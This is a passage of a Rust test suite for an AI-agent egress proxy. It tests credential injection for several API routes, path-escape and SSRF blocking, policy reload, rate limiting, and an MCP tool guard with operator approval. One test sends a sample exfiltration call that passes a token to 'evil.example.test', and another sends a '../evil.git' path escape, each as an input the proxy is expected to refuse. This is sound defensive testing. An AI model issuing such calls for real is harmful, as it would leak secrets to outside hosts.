                    .expect("credential store should open"),
            ),
            client: reqwest::Client::builder()
                .no_proxy()
                .redirect(RedirectPolicy::none())
                .build()
                .expect("client should build"),
            events: Arc::new(NoopEventEmitter),
            rate_limits: Arc::new(Mutex::new(
                rate_limits
                    .iter()
                    .map(|(route_id, limit)| {
                        (route_id.clone(), FixedWindowLimiter::from_config(limit))
                    })
                    .collect(),
            )),
            mcp_guard_states: Arc::new(Mutex::new(BTreeMap::new())),
            approval_coordinator: None,
        }
    }

    fn test_state_with_approvals(
        root: &Path,
        route: BrokerRoute,
        policy: NetworkPolicy,
        rate_limits: BTreeMap<String, EgressProxyRateLimit>,
        approval_coordinator: Option<agentenv_approvals::ApprovalCoordinator>,
    ) -> ProxyState {
        let mut state = test_state(root, route, policy, rate_limits);
        state.approval_coordinator = approval_coordinator;
        state
    }

    #[test]
    fn openai_route_injects_bearer_and_strips_request_identity_headers() {
        let route = test_openai_route();
        let mut request = Request::builder()
            .method("POST")
            .uri("/v1/openai/chat/completions")
            .body(Vec::<u8>::new())
            .unwrap();
        request.headers_mut().insert(
            "authorization",
            HeaderValue::from_static("Bearer sandbox-token"),
        );
        request
            .headers_mut()
            .insert("x-request-id", HeaderValue::from_static("sandbox-id"));

        let transformed =
            transform_request_for_route(&route, request, &SecretString::from("sk-real"))
                .expect("request transforms");

        assert_eq!(transformed.headers()["authorization"], "Bearer sk-real");
        assert!(!transformed.headers().contains_key("x-request-id"));
        assert_eq!(transformed.uri().path(), "/v1/chat/completions");
    }

    #[test]
    fn anthropic_route_injects_x_api_key() {
        let route = test_anthropic_route();
        let request = Request::builder()
            .method("POST")
            .uri("/v1/anthropic/v1/messages")
            .body(Vec::<u8>::new())
            .unwrap();

        let transformed =
            transform_request_for_route(&route, request, &SecretString::from("anthropic-real"))
                .expect("request transforms");

        assert_eq!(transformed.headers()["x-api-key"], "anthropic-real");
        assert!(!transformed.headers().contains_key("authorization"));
        assert_eq!(transformed.uri().path(), "/v1/messages");
    }

    #[test]
    fn github_route_injects_bearer_token() {
        let route = test_github_route();
        let request = test_request("/v1/github/api/repos/windoliver/agentenv");

        let transformed =
            transform_request_for_route(&route, request, &SecretString::from("ghp-real"))
                .expect("request transforms");

        assert_eq!(transformed.headers()["authorization"], "Bearer ghp-real");
        assert_eq!(transformed.uri().path(), "/repos/windoliver/agentenv");
    }

    #[test]
    fn github_git_route_injects_bearer_token() {
        let route = test_github_git_route();
        let request = test_request(
            "/v1/github/git/windoliver/agentenv.git/info/refs?service=git-upload-pack",
        );

        let transformed =
            transform_request_for_route(&route, request, &SecretString::from("ghp-real"))
                .expect("request transforms");

        assert_eq!(transformed.headers()["authorization"], "Bearer ghp-real");
        assert_eq!(
            transformed.uri().path(),
            "/windoliver/agentenv.git/info/refs"
        );
        assert_eq!(transformed.uri().query(), Some("service=git-upload-pack"));
    }

    #[test]
    fn github_git_route_rejects_path_escape() {
        let route = test_github_git_route();
        let request = test_request("/v1/github/git/../evil.git/info/refs");

        let error = transform_request_for_route(&route, request, &SecretString::from("ghp-real"))
            .expect_err("unsafe GitHub git path should be rejected");

        assert!(error.to_string().contains("unsafe upstream path"));
    }

    #[test]
    fn github_git_route_rejects_non_smart_http_suffix() {
        let route = test_github_git_route();
        let request =
            test_request("/v1/github/git/windoliver/agentenv.git/archive/refs/heads/main.zip");

        let error = transform_request_for_route(&route, request, &SecretString::from("ghp-real"))
            .expect_err("non-smart-HTTP GitHub git path should be rejected");

        assert!(error.to_string().contains("smart HTTP"));
    }

    #[test]
    fn mcp_route_injects_bearer_token() {
        let route = test_mcp_route();
        let request = test_request("/v1/mcp/primary");

        let transformed =
            transform_request_for_route(&route, request, &SecretString::from("mcp-real"))
                .expect("request transforms");

        assert_eq!(transformed.headers()["authorization"], "Bearer mcp-real");
        assert_eq!(transformed.uri().path(), "/rpc");
    }

    #[tokio::test]
    async fn mcp_guard_denies_url_allowlist_violation_before_credential_resolution() {
        let root = temp_dir("agentenv-proxy-mcp-guard-deny");
        fs::create_dir_all(&root).expect("temp dir should be created");
        let mut route = test_mcp_route();
        route.upstream_base_url = "https://93.184.216.34/rpc".parse().unwrap();
        route.allowed_hosts = BTreeSet::from(["93.184.216.34".to_owned()]);
        route.mcp_guard = Some(agentenv_proto::McpGuardConfig {
            enabled: true,
            default_approval: agentenv_proto::McpApprovalMode::Never,
            tool_policies: [(
                "web.fetch".to_owned(),
                agentenv_proto::McpToolPolicy {
                    url_allowlist: vec!["api.github.com".to_owned()],
                    ..agentenv_proto::McpToolPolicy::default()
                },
            )]
            .into_iter()
            .collect(),
            cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy::default(),
            ..agentenv_proto::McpGuardConfig::default()
        });
        let policy = policy_with_rules(&["93.184.216.34"], &[]);
        let state = Arc::new(test_state(&root, route, policy.clone(), BTreeMap::new()));
        fs::write(
            &state.config.policy_path,
            serde_json::to_vec(&policy).expect("policy should serialize"),
        )
        .expect("policy should be written");
        let request = Request::builder()
            .method("POST")
            .uri("/v1/mcp/primary")
            .header("content-type", "application/json")
            .body(Body::from(
                serde_json::to_vec(&serde_json::json!({
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/call",
                    "params": {
                        "name": "web.fetch",
                        "arguments": {"url": "https://evil.example.test/?token=secret"}
                    }
                }))
                .expect("request body should serialize"),
            ))
            .expect("request should build");

        let response = handle_proxy_request(Arc::clone(&state), request)
            .await
            .expect("guard denial should be handled");

        assert_eq!(response.status(), StatusCode::FORBIDDEN);

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn mcp_guard_per_call_policy_waits_for_operator_denial() {
        let root = temp_dir("agentenv-proxy-mcp-guard-approval");
        fs::create_dir_all(&root).expect("temp dir should be created");
        let mut route = test_mcp_route();
        route.upstream_base_url = "https://93.184.216.34/rpc".parse().unwrap();
        route.allowed_hosts = BTreeSet::from(["93.184.216.34".to_owned()]);
        route.mcp_guard = Some(agentenv_proto::McpGuardConfig {
            enabled: true,
            default_approval: agentenv_proto::McpApprovalMode::PerCall,
            tool_policies: BTreeMap::new(),
            cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy::default(),
            ..agentenv_proto::McpGuardConfig::default()
        });
        let policy = policy_with_rules(&["93.184.216.34"], &[]);
        let approval_db = root.join("events.db");
        let coordinator = agentenv_approvals::ApprovalCoordinator::new(
            agentenv_approvals::ApprovalCoordinatorConfig {
                store: agentenv_approvals::ApprovalStore::open(&approval_db)
                    .expect("approval store should open"),
                events: Arc::new(agentenv_events::NoopEventEmitter),
                poll_interval: std::time::Duration::from_millis(10),
                overlay_path: None,
                proposal_path: None,
                notifications: None,
            },
        );
        let state = Arc::new(test_state_with_approvals(
            &root,
            route,
            policy.clone(),
            BTreeMap::new(),
            Some(coordinator),
        ));
        fs::write(
            &state.config.policy_path,
            serde_json::to_vec(&policy).expect("policy should serialize"),
        )
        .expect("policy should be written");
        let approval_db_for_decider = approval_db.clone();
        let decider = tokio::spawn(async move {
            let store = agentenv_approvals::ApprovalStore::open(&approval_db_for_decider)
                .expect("approval store should open");
            loop {
                let pending = store
                    .list_requests(agentenv_approvals::ApprovalRequestFilter {
                        env: Some("demo".to_owned()),
                        status: Some(agentenv_approvals::ApprovalStatus::Pending),
                    })
                    .expect("approval requests should list");
                if let Some(request) = pending.first() {
                    store
                        .record_decision(&agentenv_approvals::ApprovalDecisionRecord {
                            request_id: request.id.clone(),
                            decision: agentenv_approvals::ApprovalDecisionValue::Deny,
                            scope: agentenv_approvals::ApprovalScope::Once,
                            decided_by: "agentenv:test".to_owned(),
                            decided_at: time::OffsetDateTime::now_utc(),
                            reason: Some("test_denial".to_owned()),
                            context: serde_json::json!({"source": "test"}),
                            trace_id: request.created_trace_id.clone(),
                        })
                        .expect("approval decision should record");
                    break;
                }
                tokio::time::sleep(std::time::Duration::from_millis(10)).await;
            }
        });
        let request = Request::builder()
            .method("POST")
            .uri("/v1/mcp/primary")
            .header("content-type", "application/json")
            .body(Body::from(
                r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"filesystem.write","arguments":{"path":"/tmp/a"}}}"#,
            ))
            .expect("request should build");

        let response = handle_proxy_request(Arc::clone(&state), request)
            .await
            .expect("guard denial should be handled");
        tokio::time::timeout(std::time::Duration::from_millis(500), decider)
            .await
            .expect("approval request should be created and denied")
            .expect("decider task should finish");

        assert_eq!(response.status(), StatusCode::FORBIDDEN);

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn oci_route_preserves_registry_path_and_injects_bearer() {
        let route = test_oci_route();
        let request = test_request("/v1/oci/ghcr.io/v2/acme/app/manifests/latest");

        let transformed =
            transform_request_for_route(&route, request, &SecretString::from("oci-real"))
                .expect("request transforms");

        assert_eq!(transformed.headers()["authorization"], "Bearer oci-real");
        assert_eq!(transformed.uri().path(), "/v2/acme/app/manifests/latest");
    }

    #[test]
    fn oci_route_rejects_non_distribution_path() {
        let route = test_oci_route();
        let request = test_request("/v1/oci/ghcr.io/token");

        let error = transform_request_for_route(&route, request, &SecretString::from("oci-real"))
            .expect_err("non-/v2 OCI path should be rejected");

        assert!(error.to_string().contains("must stay under /v2/"));
    }

    #[tokio::test]
    async fn policy_reload_blocks_route_after_file_update() {
        let root = temp_dir("agentenv-proxy-policy-reload");
        fs::create_dir_all(&root).expect("temp dir should be created");
        let route = test_openai_route();
        let allow_policy = policy_with_rules(&["api.openai.com"], &[]);
        let deny_policy = policy_with_rules(&[], &["api.openai.com"]);
        let state = test_state(&root, route.clone(), allow_policy.clone(), BTreeMap::new());
        fs::write(
            &state.config.policy_path,
            serde_json::to_vec(&allow_policy).expect("allow policy should serialize"),
        )
        .expect("allow policy should be written");

        let upstream =
            upstream_url_for_request(&route, &Method::GET, &"/v1/openai/models".parse().unwrap())
                .expect("upstream URL should map");
        {
            let policy = state.policy.read().await;
            assert!(policy_allows(&policy, &route, &Method::GET, &upstream));
        }

        fs::write(
            &state.config.policy_path,
            serde_json::to_vec(&deny_policy).expect("deny policy should serialize"),
        )
        .expect("deny policy should be written");
        reload_policy(&state).await;

        {
            let policy = state.policy.read().await;
            assert!(!policy_allows(&policy, &route, &Method::GET, &upstream));
        }

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn route_rate_limit_denies_excess_requests() {
        let root = temp_dir("agentenv-proxy-rate-limit");
        fs::create_dir_all(&root).expect("temp dir should be created");
        let mut limits = BTreeMap::new();
        limits.insert(
            "openai".to_owned(),
            EgressProxyRateLimit {
                requests_per_minute: 1,
            },
        );
        let state = test_state(
            &root,
            test_openai_route(),
            policy_with_rules(&["api.openai.com"], &[]),
            limits,
        );

        assert!(rate_limit_allows(&state, "openai").expect("limiter should run"));
        assert!(!rate_limit_allows(&state, "openai").expect("limiter should run"));

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn invalid_route_path_does_not_consume_rate_limit() {
        let root = temp_dir("agentenv-proxy-invalid-path-rate-limit");
        fs::create_dir_all(&root).expect("temp dir should be created");
        let policy = policy_with_rules(&["ghcr.io"], &[]);
        let mut limits = BTreeMap::new();
        limits.insert(
            "oci.ghcr.io".to_owned(),
            EgressProxyRateLimit {
                requests_per_minute: 1,
            },
        );
        let state = Arc::new(test_state(&root, test_oci_route(), policy.clone(), limits));
        fs::write(
            &state.config.policy_path,
            serde_json::to_vec(&policy).expect("policy should serialize"),
        )
        .expect("policy should be written");
        let request = Request::builder()
            .method("GET")
            .uri("/v1/oci/ghcr.io/token")
            .body(Body::empty())
            .expect("request should build");

        let response = handle_proxy_request(Arc::clone(&state), request)
            .await
            .expect("invalid route path should be handled as a denial");

        assert_eq!(response.status(), StatusCode::FORBIDDEN);
        assert!(
            rate_limit_allows(&state, "oci.ghcr.io").expect("limiter should run"),
            "invalid requests must not consume route quota"
        );

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn loopback_upstream_is_blocked_by_ssrf_before_forwarding() {
        let root = temp_dir("agentenv-proxy-ssrf-loopback");
        fs::create_dir_all(&root).expect("temp dir should be created");
        let route = test_loopback_route();
        let policy = NetworkPolicy {
            network: NetworkAccessPolicy {
                reloadability: PolicyReloadability::HotReload,
                allow: vec![NetworkRule {
                    target: NetworkTarget::Host {
                        host: "127.0.0.1".to_owned(),
                        port: Some(8080),
                        scheme: Some("http".to_owned()),
                        http_access: Some(HttpAccessLevel::Full),
                    },
                }],
                deny: Vec::new(),
                approval_required: Vec::new(),
                dns: DnsPolicy::default(),
            },
            ..policy_with_rules(&[], &[])
        };
        let state = Arc::new(test_state(&root, route, policy.clone(), BTreeMap::new()));
        fs::write(
            &state.config.policy_path,
            serde_json::to_vec(&policy).expect("policy should serialize"),
        )
        .expect("policy should be written");
        let request = Request::builder()
            .method("GET")
            .uri("/v1/mcp/loopback")
            .body(Body::empty())
            .expect("request should build");

        let response = handle_proxy_request(Arc::clone(&state), request)
            .await
            .expect("SSRF denial should be handled before credential resolution");

        assert_eq!(response.status(), StatusCode::FORBIDDEN);

        let _ = fs::remove_dir_all(root);
    }
}
